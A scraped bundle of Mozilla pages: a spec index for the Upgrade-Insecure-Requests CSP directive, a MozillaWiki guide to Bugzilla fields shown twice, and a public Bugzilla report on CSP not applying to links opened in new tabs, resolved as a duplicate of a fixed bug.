      Should insecure requests be upgraded for client?](#ref-for-valdef-insecure-requests-policy-do-not-upgrade②)  [(2)](#ref-for-valdef-insecure-requests-policy-do-not-upgrade③)

**<#valdef-insecure-requests-policy-upgrade>****Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-valdef-insecure-requests-policy-upgrade) * [3.3. Policy Inheritance](#ref-for-valdef-insecure-requests-policy-upgrade①) [(2)](#ref-for-valdef-insecure-requests-policy-upgrade②) [(3)](#ref-for-valdef-insecure-requests-policy-upgrade③) [(4)](#ref-for-valdef-insecure-requests-policy-upgrade④) [(5)](#ref-for-valdef-insecure-requests-policy-upgrade⑤) [(6)](#ref-for-valdef-insecure-requests-policy-upgrade⑥) [(7)](#ref-for-valdef-insecure-requests-policy-upgrade⑦)

**<#upgrade-insecure-navigations-set>****Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-upgrade-insecure-navigations-set) * [3.3. Policy Inheritance](#ref-for-upgrade-insecure-navigations-set①) [(2)](#ref-for-upgrade-insecure-navigations-set②) [(3)](#ref-for-upgrade-insecure-navigations-set③) [(4)](#ref-for-upgrade-insecure-navigations-set④) [(5)](#ref-for-upgrade-insecure-navigations-set⑤) [(6)](#ref-for-upgrade-insecure-navigations-set⑥)* [4.1.
      Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-upgrade-insecure-navigations-set⑦)

**<#upgrade-insecure-requests>****Referenced in:**

* [1. Introduction](#ref-for-upgrade-insecure-requests)* [1.2.1. Non-navigational Upgrades](#ref-for-upgrade-insecure-requests①)* [1.2.2. Navigational Upgrades](#ref-for-upgrade-insecure-requests②) [(2)](#ref-for-upgrade-insecure-requests③)* [1.2.3. Failed Upgrade](#ref-for-upgrade-insecure-requests④)* [1.3. Recommendations](#ref-for-upgrade-insecure-requests⑤) [(2)](#ref-for-upgrade-insecure-requests⑥) [(3)](#ref-for-upgrade-insecure-requests⑦)* [2. Key Concepts and Terminology](#ref-for-upgrade-insecure-requests⑧) [(2)](#ref-for-upgrade-insecure-requests⑨) [(3)](#ref-for-upgrade-insecure-requests①⓪) [(4)](#ref-for-upgrade-insecure-requests①①) [(5)](#ref-for-upgrade-insecure-requests①②)* [3.1.1. Relation to "Mixed Content"](#ref-for-upgrade-insecure-requests①③) [(2)](#ref-for-upgrade-insecure-requests①④)* [3.2.1.
                The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-upgrade-insecure-requests①⑤)  [(2)](#ref-for-upgrade-insecure-requests①⑥) [(3)](#ref-for-upgrade-insecure-requests①⑦)* [3.4. Reporting Upgrades](#ref-for-upgrade-insecure-requests①⑧)* [4.2.
                    Should insecure requests be upgraded for client?](#ref-for-upgrade-insecure-requests①⑨) * [5.1. Interaction with HSTS](#ref-for-upgrade-insecure-requests②⓪)* [5.2. CSP Violation Reports](#ref-for-upgrade-insecure-requests②①)* [7.1. Legacy Clients](#ref-for-upgrade-insecure-requests②②)* [7.2. Relation to HSTS](#ref-for-upgrade-insecure-requests②③) [(2)](#ref-for-upgrade-insecure-requests②④)

**<#upgrade-insecure-requests-http-request-header-field>****Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-upgrade-insecure-requests-http-request-header-field)* [3.2. Feature Detecting Clients Capable of Upgrading](#ref-for-upgrade-insecure-requests-http-request-header-field①)* [3.2.1.
      The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-upgrade-insecure-requests-http-request-header-field②)  [(2)](#ref-for-upgrade-insecure-requests-http-request-header-field③) [(3)](#ref-for-upgrade-insecure-requests-http-request-header-field④) [(4)](#ref-for-upgrade-insecure-requests-http-request-header-field⑤) [(5)](#ref-for-upgrade-insecure-requests-http-request-header-field⑥) [(6)](#ref-for-upgrade-insecure-requests-http-request-header-field⑦) [(7)](#ref-for-upgrade-insecure-requests-http-request-header-field⑧) [(8)](#ref-for-upgrade-insecure-requests-http-request-header-field⑨)* [4.1.
        Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-upgrade-insecure-requests-http-request-header-field①⓪)  [(2)](#ref-for-upgrade-insecure-requests-http-request-header-field①①)

**<#upgrade-request>****Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-upgrade-request) [(2)](#ref-for-upgrade-request)* [3.1.1. Relation to "Mixed Content"](#ref-for-upgrade-request)* [3.2.1.
      The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-upgrade-request) * [4.1.
        Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-upgrade-request)



=== Content from wiki.mozilla.org_3659d679_20250121_013513.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_482398b7_20250121_013510.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1437009)
* [XML](/show_bug.cgi?ctype=xml&id=1437009)

Closed
[Bug 1437009](/show_bug.cgi?id=1437009)

Opened 7 years ago
Closed 6 years ago

# CSP is not propagated to the TriggeringPrincipal for right-click new tab,ctrl-click new tab, drag & drop new tab cases

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

CSP is not propagated to the TriggeringPrincipal for right-click new tab,ctrl-click new tab, drag & drop new tab cases

## Categories

### (Core :: DOM: Security, defect, P3)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Security#DOM%3A%20Security)

DOM: Security
▾

Core :: DOM: Security
Native content-based security features including: Content Security Policy (CSP), Mixed Content Blocker (MCB), and Safe Browsing.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Security&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Security&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Security)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

60 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P3

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
DUPLICATE
of [bug 1515863](/show_bug.cgi?id=1515863 "VERIFIED FIXED")

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

DUPLICATE

of

Mark as Duplicate

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| Webcompat Score | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: vinoth, Unassigned)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

*Unassigned*

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/ec2a03d356e12a1358494ee4e5388b00?d=mm&size=40)  [vinoth](/user_profile?user_id=601215)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=40)  [freddy](/user_profile?user_id=428608)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

8 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[965637](/show_bug.cgi?id=965637 "RESOLVED FIXED - Move CSP from nsIPrincipal into the Client")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[1422284](/show_bug.cgi?id=1422284 "RESOLVED FIXED - CSP upgrade insecure requests follow through to new (insecured) domains")

Dependency [tree](/showdependencytree.cgi?id=1437009&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1437009)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1456848](/show_bug.cgi?id=1456848 "RESOLVED DUPLICATE - CSP bypass with middle click"), [1494313](/show_bug.cgi?id=1494313 "RESOLVED DUPLICATE - CSP bypass when force open in new tab"), [1529264](/show_bug.cgi?id=1529264 "RESOLVED DUPLICATE - CSP does not work on javascript-links if user holds in Ctrl or Shift")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Whiteboard: [domsecurity-backlog1])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

---

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[domsecurity-backlog1]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Vinothkumar Nagasayanan [:vinoth]](/user_profile?user_id=601215)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1437009#c0)• 7 years ago |
|  | |

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Build ID: 20180206100151
Steps to reproduce:
1. click the link <https://www.halesworth.net/links/list_two.php?code=3>
2. Find the link in the list with the name "Walpole Chapel".
3. Normal click on the link from [2] will throw "Your connection is not secure" and the page will not be loaded. Because of the "upgrade-insecure-reqeusts" CSP from [1]
4. Opening the link using Right-Click new tab or ctrl-click new tab or drag-and-drop new tab will load the page without any "Your connection is not secure" error.
Actual results:
Summary of actual result:
\* right-click secure link to force top-level navigation
\* the initial load is secure link
\* the requests hits a 30x redirect to navigate to insecure cross-origin page
This is because the CSP is not propagated to the TriggeringPrincipal for these scenarios.
CSP object is null in the below line of code,
<https://dxr.mozilla.org/mozilla-central/source/docshell/base/nsDocShell.cpp#10753>
Expected results:
Expected Result:
Link should be blocked from loading for all these scenarios because of the "upgrade-insecure-reqeusts" CSP.
CSP should be propagated to the Principal for all these scenarios.

|  | [Vinothkumar Nagasayanan [:vinoth]](/user_profile?user_id=601215)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1437009#a91_601215)• 7 years ago |

Blocks: [1422284](/show_bug.cgi?id=1422284 "RESOLVED FIXED - CSP upgrade insecure requests follow through to new (insecured) domains")Component: Untriaged → DOM: SecurityProduct: Firefox → Core

|  | [Christoph Kerschbaumer [:ckerschb]](/user_profile?user_id=363267) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1437009#a260173_363267)• 7 years ago |

Priority: -- → P3Whiteboard: [domsecurity-backlog1]

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1437009#a6680350_5898)• 7 years ago |

Restrict Comments: true

|  | [Christoph Kerschbaumer [:ckerschb]](/user_profile?user_id=363267) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1437009#a19958492_363267)• 6 years ago |

Depends on: [965637](/show_bug.cgi?id=965637 "RESOLVED FIXED - Move CSP from nsIPrincipal into the Client")

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1437009#c4)• 6 years ago |
|  | |

The original testcase here doesn't work anymore because the links have been changed in markup. However, I believe this bug was fixed in 66 and later by [bug 1515863](/show_bug.cgi?id=1515863 "VERIFIED FIXED"). Vinoth / Christoph, can you confirm?

Flags: needinfo?(ckerschb)Flags: needinfo?(cegvinoth)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1437009#c5)• 6 years ago |
|  | |

(the dupes that use inline JS still open tabs but the JS doesn't run, which seems reasonable behavior)

|  | [Christoph Kerschbaumer [:ckerschb]](/user_profile?user_id=363267) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1437009#c6)• 6 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #4](/show_bug.cgi?id=1437009#c4 "RESOLVED DUPLICATE - CSP is not propagated to the TriggeringPrincipal for right-click new tab,ctrl-click new tab, drag & drop new tab cases"))

> The original testcase here doesn't work anymore because the links have been changed in markup. However, I believe this bug was fixed in 66 and later by [bug 1515863](/show_bug.cgi?id=1515863 "VERIFIED FIXED"). Vinoth / Christoph, can you confirm?

Yes, I can confirm that [Bug 1515863](/show_bug.cgi?id=1515863 "VERIFIED FIXED") fixed that problem. Marking this bug as a duplicate of 1515863.

Status: UNCONFIRMED → RESOLVEDClosed: 6 years agoFlags: needinfo?(ckerschb)Flags: needinfo?(cegvinoth)Resolution: --- → DUPLICATE
You need to [log in](/show_bug.cgi?id=1437009&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑



=== Content from wiki.mozilla.org_73f8d6fa_20250121_013513.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

